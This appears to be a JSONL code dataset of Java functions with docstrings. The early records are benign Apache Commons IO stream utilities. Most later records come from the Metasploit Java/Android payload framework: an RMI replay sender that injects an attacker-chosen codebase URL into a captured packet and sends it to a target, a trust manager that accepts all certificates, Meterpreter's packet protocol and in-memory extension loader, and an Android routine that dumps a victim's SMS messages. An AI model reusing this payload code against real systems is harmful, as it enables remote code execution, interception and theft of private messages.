{"docstring": "/**\n * Read characters from an input character stream.\n * This implementation guarantees that it will read as many characters\n * as possible before giving up; this may not always be the case for\n * subclasses of {@link Reader}.\n * \n * @param input where to read input from\n * @param buffer destination\n * @param offset inital offset into buffer\n * @param length length to read, must be >= 0\n * @return actual length read; may be less than requested if EOF was reached\n * @throws IOException if a read error occurs\n * @since 2.2\n */\n", "func_signal": "public static int read(Reader input, char[] buffer, int offset, int length) throws IOException", "code": "{\n    if (length < 0) {\n        throw new IllegalArgumentException(\"Length must not be negative: \" + length);\n    }\n    int remaining = length;\n    while (remaining > 0) {\n        int location = length - remaining;\n        int count = input.read(buffer, offset + location, remaining);\n        if (EOF == count) { // EOF\n            break;\n        }\n        remaining -= count;\n    }\n    return length - remaining;\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Read bytes from an input stream.\n * This implementation guarantees that it will read as many bytes\n * as possible before giving up; this may not always be the case for\n * subclasses of {@link InputStream}.\n * \n * @param input where to read input from\n * @param buffer destination\n * @param offset inital offset into buffer\n * @param length length to read, must be >= 0\n * @return actual length read; may be less than requested if EOF was reached\n * @throws IOException if a read error occurs\n * @since 2.2\n */\n", "func_signal": "public static int read(InputStream input, byte[] buffer, int offset, int length) throws IOException", "code": "{\n    if (length < 0) {\n        throw new IllegalArgumentException(\"Length must not be negative: \" + length);\n    }\n    int remaining = length;\n    while (remaining > 0) {\n        int location = length - remaining;\n        int count = input.read(buffer, offset + location, remaining);\n        if (EOF == count) { // EOF\n            break;\n        }\n        remaining -= count;\n    }\n    return length - remaining;\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Get the contents of an <code>InputStream</code> as a character array\n * using the specified character encoding.\n * <p>\n * Character encoding names can be found at\n * <a href=\"http://www.iana.org/assignments/character-sets\">IANA</a>.\n * <p>\n * This method buffers the input internally, so there is no need to use a\n * <code>BufferedInputStream</code>.\n * \n * @param is  the <code>InputStream</code> to read from\n * @param encoding  the encoding to use, null means platform default\n * @return the requested character array\n * @throws NullPointerException if the input is null\n * @throws IOException if an I/O error occurs\n * @since 1.1\n */\n", "func_signal": "public static char[] toCharArray(InputStream is, String encoding)\n        throws IOException", "code": "{\n    CharArrayWriter output = new CharArrayWriter();\n    copy(is, output, encoding);\n    return output.toCharArray();\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Read the requested number of characters or fail if there are not enough left.\n * <p>\n * This allows for the possibility that {@link Reader#read(char[], int, int)} may\n * not read as many characters as requested (most likely because of reaching EOF).\n * \n * @param input where to read input from\n * @param buffer destination\n * @param offset inital offset into buffer\n * @param length length to read, must be >= 0\n * \n * @throws IOException if there is a problem reading the file\n * @throws IllegalArgumentException if length is negative\n * @throws EOFException if the number of characters read was incorrect\n * @since 2.2\n */\n", "func_signal": "public static void readFully(Reader input, char[] buffer, int offset, int length) throws IOException", "code": "{\n    int actual = read(input, buffer, offset, length);\n    if (actual != length) {\n        throw new EOFException(\"Length to read: \" + length + \" actual: \" + actual);\n    }\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Skip characters from an input character stream.\n * This implementation guarantees that it will read as many characters\n * as possible before giving up; this may not always be the case for\n * subclasses of {@link Reader}.\n *   \n * @param input character stream to skip\n * @param toSkip number of characters to skip.\n * @return number of characters actually skipped.\n * \n * @see Reader#skip(long)\n * \n * @throws IOException if there is a problem reading the file\n * @throws IllegalArgumentException if toSkip is negative\n * @since 2.0\n */\n", "func_signal": "public static long skip(Reader input, long toSkip) throws IOException", "code": "{\n    if (toSkip < 0) {\n        throw new IllegalArgumentException(\"Skip count must be non-negative, actual: \" + toSkip);\n    }\n    /*\n     * N.B. no need to synchronize this because: - we don't care if the buffer is created multiple times (the data\n     * is ignored) - we always use the same size buffer, so if it it is recreated it will still be OK (if the buffer\n     * size were variable, we would need to synch. to ensure some other thread did not create a smaller one)\n     */\n    if (SKIP_CHAR_BUFFER == null) {\n        SKIP_CHAR_BUFFER = new char[SKIP_BUFFER_SIZE];\n    }\n    long remain = toSkip;\n    while (remain > 0) {\n        long n = input.read(SKIP_CHAR_BUFFER, 0, (int) Math.min(remain, SKIP_BUFFER_SIZE));\n        if (n < 0) { // EOF\n            break;\n        }\n        remain -= n;\n    }\n    return toSkip - remain;\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Get contents of an <code>InputStream</code> as a <code>byte[]</code>.\n * Use this method instead of <code>toByteArray(InputStream)</code>\n * when <code>InputStream</code> size is known.\n * <b>NOTE:</b> the method checks that the length can safely be cast to an int without truncation\n * before using {@link IOUtils#toByteArray(java.io.InputStream, int)} to read into the byte array.\n * (Arrays can have no more than Integer.MAX_VALUE entries anyway)\n * \n * @param input the <code>InputStream</code> to read from\n * @param size the size of <code>InputStream</code>\n * @return the requested byte array\n * @throws IOException if an I/O error occurs or <code>InputStream</code> size differ from parameter size\n * @throws IllegalArgumentException if size is less than zero or size is greater than Integer.MAX_VALUE\n * @see IOUtils#toByteArray(java.io.InputStream, int)\n * @since 2.1\n */\n", "func_signal": "public static byte[] toByteArray(InputStream input, long size) throws IOException", "code": "{\n\n  if(size > Integer.MAX_VALUE) {\n      throw new IllegalArgumentException(\"Size cannot be greater than Integer max value: \" + size);\n  }\n\n  return toByteArray(input, (int) size);\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "// read char[]\n//-----------------------------------------------------------------------\n/**\n * Get the contents of an <code>InputStream</code> as a character array\n * using the default character encoding of the platform.\n * <p>\n * This method buffers the input internally, so there is no need to use a\n * <code>BufferedInputStream</code>.\n * \n * @param is  the <code>InputStream</code> to read from\n * @return the requested character array\n * @throws NullPointerException if the input is null\n * @throws IOException if an I/O error occurs\n * @since 1.1\n */\n", "func_signal": "public static char[] toCharArray(InputStream is) throws IOException", "code": "{\n    CharArrayWriter output = new CharArrayWriter();\n    copy(is, output);\n    return output.toCharArray();\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Writes the <code>toString()</code> value of each item in a collection to\n * a <code>Writer</code> line by line, using the specified line ending.\n *\n * @param lines  the lines to write, null entries produce blank lines\n * @param lineEnding  the line separator to use, null is system default\n * @param writer  the <code>Writer</code> to write to, not null, not closed\n * @throws NullPointerException if the input is null\n * @throws IOException if an I/O error occurs\n * @since 1.1\n */\n", "func_signal": "public static void writeLines(Collection<?> lines, String lineEnding,\n        Writer writer) throws IOException", "code": "{\n    if (lines == null) {\n        return;\n    }\n    if (lineEnding == null) {\n        lineEnding = LINE_SEPARATOR;\n    }\n    for (Object line : lines) {\n        if (line != null) {\n            writer.write(line.toString());\n        }\n        writer.write(lineEnding);\n    }\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Writes bytes from a <code>byte[]</code> to chars on a <code>Writer</code>\n * using the default character encoding of the platform.\n * <p>\n * This method uses {@link String#String(byte[])}.\n * \n * @param data  the byte array to write, do not modify during output,\n * null ignored\n * @param output  the <code>Writer</code> to write to\n * @throws NullPointerException if output is null\n * @throws IOException if an I/O error occurs\n * @since 1.1\n */\n", "func_signal": "public static void write(byte[] data, Writer output) throws IOException", "code": "{\n    if (data != null) {\n        output.write(new String(data));\n    }\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Writes chars from a <code>StringBuffer</code> to bytes on an\n * <code>OutputStream</code> using the specified character encoding.\n * <p>\n * Character encoding names can be found at\n * <a href=\"http://www.iana.org/assignments/character-sets\">IANA</a>.\n * <p>\n * This method uses {@link String#getBytes(String)}.\n * \n * @param data  the <code>StringBuffer</code> to write, null ignored\n * @param output  the <code>OutputStream</code> to write to\n * @param encoding  the encoding to use, null means platform default\n * @throws NullPointerException if output is null\n * @throws IOException if an I/O error occurs\n * @since 1.1\n * @deprecated replaced by write(CharSequence, OutputStream, String)\n */\n", "func_signal": "@Deprecated\npublic static void write(StringBuffer data, OutputStream output,\n        String encoding) throws IOException", "code": "{\n    if (data != null) {\n        if (encoding == null) {\n            write(data, output);\n        } else {\n            output.write(data.toString().getBytes(encoding));\n        }\n    }\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "// write CharSequence\n//-----------------------------------------------------------------------\n/**\n * Writes chars from a <code>CharSequence</code> to a <code>Writer</code>.\n * \n * @param data  the <code>CharSequence</code> to write, null ignored\n * @param output  the <code>Writer</code> to write to\n * @throws NullPointerException if output is null\n * @throws IOException if an I/O error occurs\n * @since 2.0\n */\n", "func_signal": "public static void write(CharSequence data, Writer output) throws IOException", "code": "{\n    if (data != null) {\n        write(data.toString(), output);\n    }\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Copy some or all chars from a large (over 2GB) <code>InputStream</code> to an\n * <code>OutputStream</code>, optionally skipping input chars.\n * <p>\n * This method uses the provided buffer, so there is no need to use a\n * <code>BufferedReader</code>.\n * <p>\n * \n * @param input  the <code>Reader</code> to read from\n * @param output  the <code>Writer</code> to write to\n * @param inputOffset : number of chars to skip from input before copying\n *         -ve values are ignored\n * @param length : number of chars to copy. -ve means all\n * @param buffer the buffer to be used for the copy\n * @return the number of chars copied\n * @throws NullPointerException if the input or output is null\n * @throws IOException if an I/O error occurs\n * @since 2.2\n */\n", "func_signal": "public static long copyLarge(Reader input, Writer output, final long inputOffset, final long length, char [] buffer)\n        throws IOException", "code": "{\n    if (inputOffset > 0) {\n        skipFully(input, inputOffset);\n    }\n    if (length == 0) {\n        return 0;\n    }\n    int bytesToRead = buffer.length;\n    if (length > 0 && length < buffer.length) {\n        bytesToRead = (int) length;\n    }\n    int read;\n    long totalRead = 0;\n    while (bytesToRead > 0 && EOF != (read = input.read(buffer, 0, bytesToRead))) {\n        output.write(buffer, 0, read);\n        totalRead += read;\n        if (length > 0) { // only adjust length if not reading to the end\n            // Note the cast must work because buffer.length is an integer\n            bytesToRead = (int) Math.min(length - totalRead, buffer.length);\n        }\n    }\n    return totalRead;\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Copy chars from a <code>Reader</code> to bytes on an\n * <code>OutputStream</code> using the default character encoding of the\n * platform, and calling flush.\n * <p>\n * This method buffers the input internally, so there is no need to use a\n * <code>BufferedReader</code>.\n * <p>\n * Due to the implementation of OutputStreamWriter, this method performs a\n * flush.\n * <p>\n * This method uses {@link OutputStreamWriter}.\n *\n * @param input  the <code>Reader</code> to read from\n * @param output  the <code>OutputStream</code> to write to\n * @throws NullPointerException if the input or output is null\n * @throws IOException if an I/O error occurs\n * @since 1.1\n */\n", "func_signal": "public static void copy(Reader input, OutputStream output)\n        throws IOException", "code": "{\n    OutputStreamWriter out = new OutputStreamWriter(output);\n    copy(input, out);\n    // XXX Unless anyone is planning on rewriting OutputStreamWriter, we\n    // have to flush here.\n    out.flush();\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "// readLines\n//-----------------------------------------------------------------------\n/**\n * Get the contents of an <code>InputStream</code> as a list of Strings,\n * one entry per line, using the default character encoding of the platform.\n * <p>\n * This method buffers the input internally, so there is no need to use a\n * <code>BufferedInputStream</code>.\n *\n * @param input  the <code>InputStream</code> to read from, not null\n * @return the list of Strings, never null\n * @throws NullPointerException if the input is null\n * @throws IOException if an I/O error occurs\n * @since 1.1\n */\n", "func_signal": "public static List<String> readLines(InputStream input) throws IOException", "code": "{\n    InputStreamReader reader = new InputStreamReader(input);\n    return readLines(reader);\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Copy bytes from an <code>InputStream</code> to chars on a\n * <code>Writer</code> using the default character encoding of the platform.\n * <p>\n * This method buffers the input internally, so there is no need to use a\n * <code>BufferedInputStream</code>.\n * <p>\n * This method uses {@link InputStreamReader}.\n *\n * @param input  the <code>InputStream</code> to read from\n * @param output  the <code>Writer</code> to write to\n * @throws NullPointerException if the input or output is null\n * @throws IOException if an I/O error occurs\n * @since 1.1\n */\n", "func_signal": "public static void copy(InputStream input, Writer output)\n        throws IOException", "code": "{\n    InputStreamReader in = new InputStreamReader(input);\n    copy(in, output);\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "/**\n * Writes chars from a <code>char[]</code> to bytes on an\n * <code>OutputStream</code> using the specified character encoding.\n * <p>\n * Character encoding names can be found at\n * <a href=\"http://www.iana.org/assignments/character-sets\">IANA</a>.\n * <p>\n * This method uses {@link String#String(char[])} and\n * {@link String#getBytes(String)}.\n * \n * @param data  the char array to write, do not modify during output,\n * null ignored\n * @param output  the <code>OutputStream</code> to write to\n * @param encoding  the encoding to use, null means platform default\n * @throws NullPointerException if output is null\n * @throws IOException if an I/O error occurs\n * @since 1.1\n */\n", "func_signal": "public static void write(char[] data, OutputStream output, String encoding)\n        throws IOException", "code": "{\n    if (data != null) {\n        if (encoding == null) {\n            write(data, output);\n        } else {\n            output.write(new String(data).getBytes(encoding));\n        }\n    }\n}", "path": "src\\org\\apache\\commons\\io\\IOUtils.java", "repo_name": "kghost/ics-openvpn", "stars": 92, "license": "other", "language": "java", "size": 1465}
{"docstring": "// http://download.oracle.com/javase/1.3/docs/guide/rmi/spec/rmi-protocol.html\n", "func_signal": "public static void main(String[] args) throws Exception", "code": "{\n    File rmipacket = new File(\"build/rmipacket\");\n    System.out.println(rmipacket.length());\n    DataInputStream in = new DataInputStream(new FileInputStream(rmipacket));\n    byte[] packetBytes = new byte[(int) rmipacket.length()];\n    in.readFully(packetBytes);\n    in.close();\n\n    String url = args[0];\n    String dummyURL = \"file:./rmidummy.jar\";\n\n    String packetStr = new String(packetBytes, \"ISO-8859-1\");\n    int pos = packetStr.indexOf((char) 0 + \"\" + (char) dummyURL.length() + dummyURL);\n    packetStr = packetStr.substring(0, pos + 1) + (char) url.length() + url + packetStr.substring(pos + 2 + dummyURL.length());\n    packetBytes = packetStr.getBytes(\"ISO-8859-1\");\n\n    Socket s = new Socket(args[1], Integer.parseInt(args[2]));\n    OutputStream out = s.getOutputStream();\n    out.write(\"JRMI\\0\\2K\\0\\0\\0\\0\\0\\0\".getBytes(\"ISO-8859-1\"));\n    out.write(packetBytes);\n    out.flush();\n    Thread.sleep(500);\n    s.close();\n}", "path": "javapayload\\src\\main\\java\\rmi\\RMIReplaySender.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Called by the {@link Payload} class to modify the given\n * {@link URLConnection} so that it uses this trust manager.\n */\n", "func_signal": "public static void useFor(URLConnection uc) throws Exception", "code": "{\n    if (uc instanceof HttpsURLConnection) {\n        HttpsURLConnection huc = ((HttpsURLConnection) uc);\n        PayloadTrustManager ptm = new PayloadTrustManager();\n        SSLContext sc = SSLContext.getInstance(\"SSL\");\n        sc.init(null, new TrustManager[]{ptm}, new java.security.SecureRandom());\n        huc.setSSLSocketFactory(sc.getSocketFactory());\n        huc.setHostnameVerifier(ptm);\n    }\n}", "path": "javapayload\\src\\main\\java\\metasploit\\PayloadTrustManager.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Read a TLV packet from an input stream.\n *\n * @param in        Input stream to read from\n * @param remaining length of the packet to read in bytes\n * @throws IOException if an error occurs\n */\n", "func_signal": "public TLVPacket(DataInputStream in, int remaining) throws IOException", "code": "{\n    while (remaining > 0) {\n        int len = in.readInt();\n        int type = in.readInt();\n        if (len > remaining)\n            break;\n        byte[] data = new byte[len - 8];\n        remaining -= len;\n        Object value;\n        if ((type & TLV_META_TYPE_COMPRESSED) != 0) {\n            in.readFully(data);\n            value = data;\n        } else if ((type & TLV_META_TYPE_STRING) != 0) {\n            in.readFully(data);\n            String string = new String(data, \"UTF-8\");\n            if (!string.endsWith(\"\\0\"))\n                throw new IOException(\"C string is not 0 terminated: \" + string);\n            string = string.substring(0, string.length() - 1);\n            if (string.indexOf('\\0') != -1)\n                throw new IOException(\"Embedded null detected: \" + string);\n            value = string;\n        } else if ((type & TLV_META_TYPE_QWORD) != 0 && len == 16) {\n            value = new Long(in.readLong());\n        } else if ((type & TLV_META_TYPE_UINT) != 0 && len == 12) {\n            value = new Integer(in.readInt());\n        } else if ((type & TLV_META_TYPE_BOOL) != 0 && len == 9) {\n            value = new Boolean(in.readBoolean());\n        } else if ((type & TLV_META_TYPE_RAW) != 0) {\n            in.readFully(data);\n            value = data;\n        } else if ((type & TLV_META_TYPE_GROUP) != 0) {\n            in.readFully(data);\n            DataInputStream dis = new DataInputStream(new ByteArrayInputStream(data));\n            value = new TLVPacket(dis, data.length);\n            dis.close();\n        } else if ((type & TLV_META_TYPE_COMPLEX) != 0) {\n            in.readFully(data);\n            value = data;\n        } else {\n            throw new IOException(\"Unsupported type: \" + type + \"/\" + len);\n        }\n        add(type, value);\n    }\n    if (remaining != 0) {\n        throw new IOException(\"Incomplete packets detected\");\n    }\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\TLVPacket.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "//sms/\";\n", "func_signal": "@Override\n    public int execute(Meterpreter meterpreter, TLVPacket request,\n                       TLVPacket response) throws Exception", "code": "{\n\n        Uri uriSMSURI = Uri.parse(sms);\n        Cursor cur = AndroidMeterpreter.getContext().getContentResolver()\n                .query(uriSMSURI, null, null, null, null);\n\n        while (cur.moveToNext()) {\n            TLVPacket pckt = new TLVPacket();\n\n            pckt.add(TLV_TYPE_SMS_ADDRESS,\n                    cur.getString(cur.getColumnIndex(address)));\n            pckt.add(TLV_TYPE_SMS_BODY, cur.getString(cur.getColumnIndex(body)));\n            pckt.add(TLV_TYPE_SMS_TYPE, cur.getString(cur.getColumnIndex(type)));\n            pckt.add(TLV_TYPE_SMS_STATUS,\n                    cur.getString(cur.getColumnIndex(status)));\n            pckt.add(TLV_TYPE_SMS_DATE, cur.getString(cur.getColumnIndex(date)));\n\n            response.addOverflow(TLV_TYPE_SMS_GROUP, pckt);\n\n        }\n\n        cur.close();\n\n        return ERROR_SUCCESS;\n    }", "path": "androidpayload\\library\\src\\com\\metasploit\\meterpreter\\android\\dump_sms_android.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "// http://download.oracle.com/javase/1.3/docs/guide/rmi/spec/rmi-protocol.html\n", "func_signal": "public static void main(String[] args) throws Exception", "code": "{\n    FileOutputStream fos = new FileOutputStream(\"build/rmipacket\");\n    ServerSocket ss = new ServerSocket(11099);\n    Thread t = new Thread(new Runnable() {\n        public void run() {\n            try {\n                RMISender.main(new String[]{\"file:./rmidummy.jar\", \"localhost\", \"11099\"});\n            } catch (UnmarshalException ex) {\n                // expected\n            } catch (Exception ex) {\n                ex.printStackTrace();\n            }\n        }\n    });\n    t.setDaemon(true);\n    t.start();\n    Socket s = ss.accept();\n    ss.close();\n    DataInputStream in = new DataInputStream(s.getInputStream());\n    DataOutputStream out = new DataOutputStream(s.getOutputStream());\n\n    byte[] hdr = new byte[7];\n    in.readFully(hdr);\n    if (!new String(hdr, \"ISO-8859-1\").equals(\"JRMI\\0\\2K\"))\n        throw new IOException(\"Unsupported RMI header\");\n\n    out.write('N');\n    out.writeUTF(\"127.0.0.1\");\n    out.writeInt(11099);\n    out.flush();\n\n    in.readUTF();\n    in.readInt();\n\n    s.setSoTimeout(1000);\n    try {\n        byte[] buf = new byte[4096];\n        int len;\n        while ((len = in.read(buf)) != -1) {\n            fos.write(buf, 0, len);\n        }\n    } catch (InterruptedIOException ex) {\n        // we are done\n    }\n    fos.close();\n}", "path": "javapayload\\src\\main\\java\\rmi\\RMICaptureServer.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Return the currently buffered error stream content, or <code>null</code> if no buffering is active.\n */\n", "func_signal": "public byte[] getErrorBuffer()", "code": "{\n    if (errBuffer == null) {\n        return null;\n    }\n    synchronized (errBuffer) {\n        byte[] result = errBuffer.toByteArray();\n        errBuffer.reset();\n        return result;\n    }\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\Meterpreter.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Get the value associated to a type.\n */\n", "func_signal": "public Object getValue(int type)", "code": "{\n    ArrayList indices = (ArrayList) valueMap.get(new Integer(type));\n    if (indices == null) {\n        throw new IllegalArgumentException(\"Cannot find type \" + type);\n    }\n    // the indices variable is an ArrayList so by default return the first to\n    // preserve existing behaviour.\n    return valueList.get(((Integer) indices.get(0)).intValue());\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\TLVPacket.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Write all the values to an output stream.\n */\n", "func_signal": "public void write(DataOutputStream out) throws IOException", "code": "{\n    for (Iterator it = typeOrder.iterator(); it.hasNext(); ) {\n        Integer typeKey = (Integer) it.next();\n        int type = typeKey.intValue();\n        Object value = getValue(type);\n        write(out, type, value);\n    }\n    for (Iterator it = overflowList.iterator(); it.hasNext(); ) {\n        Integer typeKey = (Integer) it.next();\n        int type = typeKey.intValue();\n        Object value = it.next();\n        write(out, type, value);\n    }\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\TLVPacket.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Send a request packet over this meterpreter.\n *\n * @param packet Packet parameters\n * @param method Method to invoke\n */\n", "func_signal": "public void writeRequestPacket(String method, TLVPacket tlv) throws IOException", "code": "{\n    tlv.add(TLVType.TLV_TYPE_METHOD, method);\n    char[] requestID = new char[32];\n    for (int i = 0; i < requestID.length; i++) {\n        requestID[i] = (char) ('A' + rnd.nextInt(26));\n    }\n    tlv.add(TLVType.TLV_TYPE_REQUEST_ID, new String(requestID));\n    this.transports.current().writePacket(tlv, TLVPacket.PACKET_TYPE_REQUEST);\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\Meterpreter.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Get the value associated to a type.\n */\n", "func_signal": "public Object getValue(int type, Object defaultValue)", "code": "{\n    ArrayList indices = (ArrayList) valueMap.get(new Integer(type));\n    if (indices == null) {\n        return defaultValue;\n    }\n    // the indices variable is an ArrayList so by default return the first to\n    // preserve existing behaviour.\n    return valueList.get(((Integer) indices.get(0)).intValue());\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\TLVPacket.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Initialize the meterpreter.\n *\n * @param in             Input stream to read from\n * @param rawOut         Output stream to write into\n * @param loadExtensions Whether to load (as a {@link ClassLoader} would do) the extension jars; disable this if you want to use your debugger's edit-and-continue feature or if you do not want to update the jars after each build\n * @param redirectErrors Whether to redirect errors to the internal error buffer; disable this to see the errors on the victim's standard error stream\n * @param beginExecution Whether to begin executing immediately\n * @throws Exception\n */\n", "func_signal": "public Meterpreter(DataInputStream in, OutputStream rawOut, boolean loadExtensions, boolean redirectErrors, boolean beginExecution) throws Exception", "code": "{\n\n    int configLen = in.readInt();\n    byte[] configBytes = new byte[configLen];\n    in.readFully(configBytes);\n\n    loadConfiguration(in, rawOut, configBytes);\n\n    // after the configuration block is a 32 bit integer that tells us\n    // how many stages were wired into the payload. We need to stash this\n    // because in the case of TCP comms, we need to skip this number of\n    // blocks down the track when we reconnect. We have to store this in\n    // the meterpreter class instead of the TCP comms class though\n    this.ignoreBlocks = in.readInt();\n\n    this.loadExtensions = loadExtensions;\n    this.commandManager = new CommandManager();\n    this.channels.add(null); // main communication channel?\n    if (redirectErrors) {\n        errBuffer = new ByteArrayOutputStream();\n        err = new PrintStream(errBuffer);\n    } else {\n        errBuffer = null;\n        err = System.err;\n    }\n    if (beginExecution) {\n        startExecuting();\n    }\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\Meterpreter.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Return the length of the currently buffered error stream content, or <code>-1</code> if no buffering is active.\n */\n", "func_signal": "public int getErrorBufferLength()", "code": "{\n    if (errBuffer == null) {\n        return -1;\n    }\n    return errBuffer.size();\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\Meterpreter.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Create a new process channel.\n *\n * @param meterpreter The meterpreter this channel should be assigned to.\n * @param process     Process of the channel\n */\n", "func_signal": "public ProcessChannel(Meterpreter meterpreter, Process process)", "code": "{\n    super(meterpreter, process.getInputStream(), process.getOutputStream());\n    this.process = process;\n    this.err = process.getErrorStream();\n    new InteractThread(err).start();\n}", "path": "meterpreter\\stdapi\\src\\main\\java\\com\\metasploit\\meterpreter\\ProcessChannel.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Called by the {@link Payload} class to modify the given\n * {@link URLConnection} so that it uses this trust manager.\n */\n", "func_signal": "public static void useFor(URLConnection uc) throws Exception", "code": "{\n    if (uc instanceof HttpsURLConnection) {\n        HttpsURLConnection huc = ((HttpsURLConnection) uc);\n        PayloadTrustManager ptm = new PayloadTrustManager();\n        SSLContext sc = SSLContext.getInstance(\"SSL\");\n        sc.init(null, new TrustManager[]{ptm},\n                new java.security.SecureRandom());\n        huc.setSSLSocketFactory(sc.getSocketFactory());\n        huc.setHostnameVerifier(ptm);\n    }\n}", "path": "androidpayload\\app\\src\\com\\metasploit\\stage\\PayloadTrustManager.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Add an element to the overflow list.\n */\n", "func_signal": "public void addOverflow(int type, Object value) throws IOException", "code": "{\n    overflowList.add(new Integer(type));\n    overflowList.add(value);\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\TLVPacket.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Load an extension into this meterpreter. Called from {@link core_loadlib}.\n *\n * @param data The extension jar's content as a byte array\n */\n", "func_signal": "public String[] loadExtension(byte[] data) throws Exception", "code": "{\n    ClassLoader classLoader = getClass().getClassLoader();\n    if (loadExtensions) {\n        URL url = MemoryBufferURLConnection.createURL(data, \"application/jar\");\n        classLoader = new URLClassLoader(new URL[]{url}, classLoader);\n    }\n    JarInputStream jis = new JarInputStream(new ByteArrayInputStream(data));\n    String loaderName = (String) jis.getManifest().getMainAttributes().getValue(\"Extension-Loader\");\n    ExtensionLoader loader = (ExtensionLoader) classLoader.loadClass(loaderName).newInstance();\n    commandManager.resetNewCommands();\n    loader.load(commandManager);\n    return commandManager.getNewCommands();\n}", "path": "meterpreter\\meterpreter\\src\\main\\java\\com\\metasploit\\meterpreter\\Meterpreter.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
{"docstring": "/**\n * Create a new socket channel.\n *\n * @param meterpreter The meterpreter this channel should be assigned to.\n * @param socket      Socket of the channel\n */\n", "func_signal": "public ServerSocketChannel(Meterpreter meterpreter, ServerSocket serverSocket) throws IOException", "code": "{\n    super(meterpreter, new ByteArrayInputStream(new byte[0]), null);\n    this.serverSocket = serverSocket;\n    new AcceptThread().start();\n}", "path": "meterpreter\\stdapi\\src\\main\\java\\com\\metasploit\\meterpreter\\ServerSocketChannel.java", "repo_name": "rapid7/metasploit-javapayload", "stars": 84, "license": "None", "language": "java", "size": 1229}
